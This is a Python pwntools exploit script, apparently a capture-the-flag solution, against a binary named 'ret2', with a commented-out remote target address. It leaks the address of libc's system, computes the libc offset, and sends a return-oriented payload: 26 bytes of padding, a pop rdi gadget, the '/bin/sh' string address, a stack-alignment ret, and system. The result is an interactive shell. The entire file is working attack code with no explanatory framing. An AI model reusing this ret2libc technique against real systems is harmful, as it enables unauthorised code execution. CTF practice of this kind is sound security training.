from pwn import *

p = process('./ret2')
# p = remote('123.57.230.48', '12346')
libc = ELF("./libc-2.27.so")

p.recvuntil(b'please input your position\n')

payload1 = b'20'
p.sendline(payload1)

p.recvuntil(b'plz input your value\n')
payload2 = b'0'
p.sendline(payload2)

#gdb.attach(p)
p.recvuntil(b'0x')
sys_addr = int(p.recv(16), 16)
print(hex(sys_addr))

ret = 0x0000000000400318
pop_rdi_addr = 0x0000000000401273

sys_libc = libc.symbols['system']
offset = sys_addr - sys_libc

binsh_libc = next(libc.search(b'/bin/sh'))
binsh_addr = offset + binsh_libc


payload3 = b'a' * 26
payload3 += p64(pop_rdi_addr) #pop rdi; ret
payload3 += p64(binsh_addr) #system函数参数
payload3 += p64(ret)#栈对齐
payload3 += p64(sys_addr)

p.send(payload3)

p.interactive()